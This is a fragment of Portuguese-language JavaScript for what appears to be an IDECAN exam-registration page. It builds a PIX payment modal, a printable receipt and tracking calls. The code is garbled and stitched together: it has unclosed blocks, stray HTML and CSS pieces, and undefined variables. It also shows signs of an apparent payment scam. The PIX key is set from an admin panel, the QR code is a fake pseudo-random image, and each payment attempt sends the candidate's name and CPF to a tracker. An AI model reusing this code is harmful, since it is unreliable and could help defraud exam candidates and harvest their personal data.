<script>
(function(){

  var now = new Date();

  var cpfEl = document.getElementById('cand-cpf');

  /* Lê todas as inscrições */

  try { inscricoes = JSON.parse(sessionStorage.getItem('idecan_inscricoes') || '[]'); } catch(e){}
  if(!Array.isArray(inscricoes)) inscricoes = [];

  /* Pré-carrega a config do PIX (chave/beneficiário cadastrados no painel admin) */
  if (window.IdecanPix && window.IdecanPix.load) {
    try { window.IdecanPix.load(); } catch (e) {}

  /* Fallback: inscrição única antiga */
  if(inscricoes.length === 0){
    try {
      var legacy = JSON.parse(sessionStorage.getItem('idecan_inscricao') || '{}');
      if(legacy && legacy.concurso){
        legacy.id = legacy.id || ('INS' + Date.now());
        legacy.protocolo = legacy.protocolo || ('IDC' + (Date.now().toString().slice(-8)));

        '<td width="60" style="vertical-align:top;padding:14px 8px">' +
          '<img src="/assets/2ec2fab246f275bb.jpg" width="60" height="60" alt="" class="bordaImagem1">' +
        '</td>' +

      '#modal-pagamento .copied.show{visibility:visible}'+
      '#modal-pagamento .footer-info{font-size:11.5px;color:#64748b;text-align:center;margin-top:14px;border-top:1px solid #e5e7eb;padding-top:12px}'+
      '#modal-pagamento .simular{margin-top:14px;background:#f59e0b;color:#fff;border:none;padding:9px 18px;font-size:13px;font-weight:700;border-radius:8px;cursor:pointer;width:100%}'+
      '#modal-pagamento .simular:hover{background:#d97706}';
    var st = document.createElement('style');
    st.textContent = css;
    document.head.appendChild(st);

    var div = document.createElement('div');
    div.id = 'modal-pagamento';
    div.setAttribute('data-testid','modal-pagamento');
    div.innerHTML =
      '<div class="box">'+
        '<div class="head">'+
          '<h3>Pagamento via PIX</h3>'+
          '<button class="close" type="button" data-testid="modal-close" aria-label="Fechar">&times;</button>'+
        '</div>'+
        '<div class="body">'+
          '<div class="info" id="modal-info"></div>'+
          '<div class="valor">Valor a pagar<b id="modal-valor">R$ 0,00</b></div>'+
          '<div class="label"><b>Escaneie o QR code com o app do seu banco</b></div>'+
          '<div class="qr-wrap"><div class="qr-box" id="modal-qr"></div></div>'+
          '<div class="label">Ou use o PIX copia e cola</div>'+
          '<div class="pix-code">'+
            '<input type="text" id="modal-pix-text" readonly data-testid="pix-text">'+
            '<button type="button" id="modal-copy-btn" data-testid="copy-btn">📋 Copiar</button>'+
          '</div>'+
          '<div class="copied" id="modal-copied">✓ Código PIX copiado!</div>'+
          '<button type="button" class="simular" id="modal-simular" data-testid="modal-imprimir">🖨️ Imprimir Inscrição</button>'+
          '<div class="footer-info">O pagamento expira em 30 minutos. Após o pagamento, a confirmação pode levar até alguns minutos.</div>'+
        '</div>'+
      '</div>';
    document.body.appendChild(div);

    div.addEventListener('click', function(e){
      if(e.target === div) closeModal();
    });
    div.querySelector('.close').addEventListener('click', closeModal);
    div.querySelector('#modal-copy-btn').addEventListener('click', function(){
      var inp = document.getElementById('modal-pix-text');
      inp.select(); inp.setSelectionRange(0, 99999);
      try {
        if(navigator.clipboard) navigator.clipboard.writeText(inp.value);
        else document.execCommand('copy');
        var msg = document.getElementById('modal-copied');
        msg.classList.add('show');
        setTimeout(function(){ msg.classList.remove('show'); }, 2200);

        if (window.IdecanTracker) {

            cpf: data.cpf || '',
            concurso: ins.concurso || '',
            cargo_codigo: ins.codigo || '',
            cargo_titulo: ins.titulo || '',
            protocolo: ins.protocolo || '',
            valor: _taxaNum,
            taxa: _taxa

        }

  function closeModal(){
    var d = document.getElementById('modal-pagamento');
    if(d) d.classList.remove('visivel');
  }

  /* Gerador de QR code VISUAL (mock determinístico baseado no protocolo)
     Mostra um QR-like SVG com marcadores de canto e padrão pseudo-aleatório. */
  function gerarQR(text, size){
    var grid = 29, cell = size/grid;
    var hash = 5381;
    for(var i=0;i<text.length;i++) hash = ((hash << 5) + hash + text.charCodeAt(i)) | 0;
    function next(){ hash = (hash * 1103515245 + 12345) | 0; return ((hash>>>16) & 0x7FFF) / 32768; }
    var svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 '+size+' '+size+'" width="'+size+'" height="'+size+'" shape-rendering="crispEdges">'+
      '<rect width="'+size+'" height="'+size+'" fill="white"/>';
    function isFinder(x,y){
      return (x<8 && y<8) || (x>=grid-8 && y<8) || (x<8 && y>=grid-8);
    }
    for(var y=0;y<grid;y++){
      for(var x=0;x<grid;x++){
        if(isFinder(x,y)) continue;
        if(next() < 0.48) svg += '<rect x="'+(x*cell)+'" y="'+(y*cell)+'" width="'+cell+'" height="'+cell+'" fill="#0b1733"/>';
      }
    }
    function corner(cx,cy){
      svg += '<rect x="'+(cx*cell)+'" y="'+(cy*cell)+'" width="'+(7*cell)+'" height="'+(7*cell)+'" fill="#0b1733"/>';
      svg += '<rect x="'+((cx+1)*cell)+'" y="'+((cy+1)*cell)+'" width="'+(5*cell)+'" height="'+(5*cell)+'" fill="white"/>';
      svg += '<rect x="'+((cx+2)*cell)+'" y="'+((cy+2)*cell)+'" width="'+(3*cell)+'" height="'+(3*cell)+'" fill="#0b1733"/>';
    }
    corner(0,0); corner(grid-7,0); corner(0,grid-7);
    svg += '</svg>';
    return svg;
  }

  async function abrirModal(idx){
    buildModal();
    var ins = inscricoes[idx];
    if(!ins) return;
    var modal = document.getElementById('modal-pagamento');
    modal.setAttribute('data-idx', idx);

    var cargoLabel = (ins.codigo ? ins.codigo + ' - ' : '') + (ins.titulo || '') + (ins.jornada ? ' - ' + ins.jornada : '');
    var taxa = ins.taxa || '';
    document.getElementById('modal-info').innerHTML =
      '<b>Candidato:</b><span>' + escape(data.nome || 'Candidato') + '</span>' +
      '<b>CPF:</b><span>' + escape(data.cpf || '') + '</span>' +
      '<b>Concurso:</b><span>' + escape(ins.concurso) + '</span>' +
      '<b>Cargo:</b><span>' + escape(cargoLabel) + '</span>' +
      '<b>Localidade:</b><span>' + escape(ins.localidade || 'CAMPINA GRANDE/PB') + '</span>' +
      '<b>Protocolo:</b><span>' + escape(ins.protocolo) + '</span>';
    document.getElementById('modal-valor').textContent = taxa;

    /* Gera código PIX (BR Code EMV) usando a chave configurada no painel admin */
    var taxaNum = parseFloat((taxa || '').replace(/[^\d,]/g, '').replace(',', '.')) || 0;
    var txid = (ins.protocolo || ('IDC' + Date.now())).replace(/[^A-Za-z0-9]/g, '').slice(0, 25);
    if (window.IdecanPix && window.IdecanPix.load) {
      try { await window.IdecanPix.load(); } catch (e) {}
    }
    var pixCode = (window.IdecanPix && window.IdecanPix.build)
      ? window.IdecanPix.build({
          valor: taxaNum,
          txid: txid,
          info: 'Inscricao ' + (ins.titulo || '').toString().slice(0, 30)
        })
      : '';
    document.getElementById('modal-pix-text').value = pixCode;
    document.getElementById('modal-qr').innerHTML = gerarQR(pixCode, 200);
    document.getElementById('modal-copied').classList.remove('show');

    modal.classList.add('visivel');

    /* Tracking: PIX gerado */
    try {
      if (window.IdecanTracker) {
        var _taxaNum = parseFloat((taxa||'').replace(/[^\d,]/g,'').replace(',','.')) || 0;
        window.IdecanTracker.pixGenerated({
          nome: data.nome || '',
          cpf: data.cpf || '',
          concurso: ins.concurso,
          cargo_codigo: ins.codigo,
          cargo_titulo: ins.titulo,
          protocolo: ins.protocolo,
          valor: _taxaNum,
          taxa: taxa
        });
      }
    } catch(e){}
  }

  /* Botão "Sair" é tratado globalmente em /assets/auth.js (mostra modal bonito de confirmação) */

  /* Liga os botões "Pagar Inscrição" */
  Array.prototype.forEach.call(document.querySelectorAll('.btn-pagar-inscricao'), function(btn){

      if(btn.disabled) return;

  /* ====================== Comprovante de Inscrição (impressão) ====================== */
  function abrirComprovante(idx){
    var ins = inscricoes[idx];
    if(!ins) return;

    var now = new Date();
    var dataEmissao = pad(now.getDate())+'/'+pad(now.getMonth()+1)+'/'+now.getFullYear()+', '+pad(now.getHours())+':'+pad(now.getMinutes());
    var exp = new Date(now.getTime() + 30*60*1000);
    var dataExp = pad(exp.getDate())+'/'+pad(exp.getMonth()+1)+'/'+exp.getFullYear()+' '+pad(exp.getHours())+':'+pad(exp.getMinutes());

    var taxaNum = parseFloat((ins.taxa || '').replace(/[^\d,]/g, '').replace(',', '.')) || 0;
    var txid = (ins.protocolo || ('IDC' + Date.now())).replace(/[^A-Za-z0-9]/g, '').slice(0, 25);
    var pixCode = (window.IdecanPix && window.IdecanPix.build)
      ? window.IdecanPix.build({
          valor: taxaNum,
          txid: txid,
          info: 'Inscricao ' + (ins.titulo || '').toString().slice(0, 30)
        })
      : '';
    var qrSvg = gerarQR(pixCode, 170);

    var cargoLabel = (ins.codigo ? ins.codigo + ' - ' : '') + (ins.titulo || '') + (ins.jornada ? ' - ' + ins.jornada : '');
    var nivel = (function(t){
      t = (t||'').toUpperCase();
      if(/SUPERIOR|PROFESSOR|ENGENHEIRO|MEDICO|MÉDICO|FISIOTERAPEUTA|PSICOLOGO|PSICÓLOGO|CONTADOR|ANALISTA/.test(t)) return 'Superior';
      if(/T[EÉ]CNIC/.test(t)) return 'Técnico';
